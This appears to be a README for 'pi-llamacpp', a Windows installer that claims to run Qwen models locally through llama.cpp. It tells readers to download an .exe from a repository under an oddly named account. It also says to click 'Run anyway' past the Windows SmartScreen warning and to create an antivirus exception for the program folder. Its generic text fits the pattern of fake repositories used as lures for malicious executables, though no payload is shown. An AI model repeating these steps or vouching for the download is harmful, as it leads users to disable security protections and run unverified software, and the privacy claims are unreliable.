# 🤖 pi-llamacpp - Run private Qwen models on Windows

[![Download pi-llamacpp](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/callaundefeated243/pi-llamacpp)

## 📋 About This Project

This software allows you to run the Qwen language model on your own hardware. It uses the llama.cpp engine to process data locally. Local processing keeps your information on your computer and removes the need for an internet connection while you use the model. This extension integrates with the Pi interface to provide a familiar experience for users who want to experiment with advanced language processing.

## 💻 System Requirements

To run this application, your computer needs specific hardware components. Check your system specifications before you begin the installation process.

- Operating System: Windows 10 or Windows 11 (64-bit).
- Processor: A modern central processing unit (CPU) with at least four physical cores.
- Memory: 8 gigabytes of system RAM or higher. If you intend to use larger models, 16 gigabytes of RAM provides better performance.
- Storage: 10 gigabytes of free disk space for the application and the model files.
- Graphics: A dedicated graphics card is optional but helps with processing speed.

## ⬇️ Downloading the Application

Follow these steps to obtain the correct files for your system.

1. Navigate to the official release page: [https://github.com/callaundefeated243/pi-llamacpp](https://github.com/callaundefeated243/pi-llamacpp).
2. Locate the section labeled "Assets."
3. Select the file ending in `.exe` to start the download.
4. Save the file to your desktop or your downloads folder.

## ⚙️ Installation Instructions

Once you have the `.exe` file, proceed with the installation.

1. Locate the file you downloaded.
2. Double-click the file icon.
3. Windows might display a security prompt titled "Windows protected your PC." 
4. If you see this prompt, click "More info," then click "Run anyway." This happens because the application is new and not yet verified by the operating system provider.
5. Follow the on-screen prompts in the installer window.
6. Choose the folder where you want to keep the program files.
7. Click the "Finish" button once the process ends. 

## 🚀 Running the software

The application manages the Qwen model for you. Use these steps to start your first session.

1. Open the pi-llamacpp application from your Start menu or the desktop shortcut.
2. A black terminal window will appear. This window displays the status of the model loading process.
3. Do not close this window while you use the software.
4. When the terminal displays a message indicating the system is ready, open your web browser.
5. Navigate to the local address provided in the terminal, usually `http://localhost:8080`.
6. You now connect to the Qwen model interface.

## 🛠️ Managing Models

The application stores model files locally. You can swap these files to change how the model responds.

1. Find the folder named "models" inside the installation directory.
2. Place compatible model files with the `.gguf` extension into this folder.
3. Restart the application.
4. The system detects the new files and allows you to select them from the settings menu in your browser.

## 📉 Troubleshooting Common Issues

If the software fails to start, check the following points.

- Insufficient Memory: If the black terminal window displays a "memory error," the model file might be too large for your computer. Try using a smaller model version.
- Blocked Port: If your browser cannot connect to the local address, another application might be using the same port. Try restarting your computer to clear active connections.
- Permissions: Ensure your antivirus software is not blocking the application. Some security tools flag local server software as a risk. Create an exception for the pi-llamacpp folder if necessary.
- Update Status: Check the main repository page periodically for updates. New releases improve stability and add compatibility with newer model versions.

## 💡 How it Works

The pi-llamacpp tool provides a bridge between the Pi interface and the llama.cpp engine. The engine handles the math required to turn your text input into intelligent responses. By managing this locally, the software bypasses the latency of web-based services. This approach offers a private way to test model responses. The system utilizes your processor to calculate token streams. A higher number of tokens per second indicates faster generation speeds on your specific hardware configuration.

## 🔒 Privacy and Security

Because this software operates entirely on your local machine, your conversations leave your computer only when you choose to export them. The application does not transmit your personal data to external servers. Use this tool for experimentation with local artificial intelligence without external surveillance or data logs. Keep your software updated to ensure your local environment contains the latest security patches for the underlying engine. 

## 📂 File Structure

The application creates a clean directory structure on your drive.

- /bin: Contains the engine executables responsible for processing.
- /data: Stores your settings and configuration preferences.
- /models: Serves as the repository for your .gguf files.
- /logs: Keeps records of the terminal output to help you diagnose errors if the software crashes.

## 📝 Usage Tips

- Use the default settings first to ensure the software runs correctly.
- Experiment with the context window size in the browser interface if you find the model forgets parts of a long conversation.
- Monitor your CPU usage via the Task Manager to see how the model impacts your system performance during heavy loads.
- If the model produces repetitive text, adjust the temperature setting in the configuration menu to a slightly higher value.
- Back up your "models" folder if you decide to customize your library.